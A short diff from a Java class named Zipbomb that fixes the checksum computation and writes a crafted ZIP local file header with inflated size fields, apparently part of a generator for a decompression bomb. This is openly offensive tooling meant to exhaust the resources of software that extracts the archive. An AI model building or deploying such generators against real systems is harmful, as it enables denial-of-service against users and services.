@@ -51,7 +51,7 @@ public class Zipbomb {
 			if ((F & 1) > 0) for (i = 32; i --> 0;) D.set(i, f(d, G.get(i)));
 			for (i = 32; i --> 0;) G.set(i, f(g, G.get(i)));
 		} while ((F >>= 1) > 0);
-		long I = ~f(D, 2 * A + 1) & A;
+		long I = ~f(D, A) & A;
 		String V = Y(I) + Y(size + 14) + Y(size * 1032 + 1);
 		output.write(("PK\u0003\u0004\u0014\0\0\0\u0008\0\0\0\0\0" + V + "\u0001\0\0\u00000\u00ed\u00c0").getBytes(), 0, 33);
 		output.write(0x81);
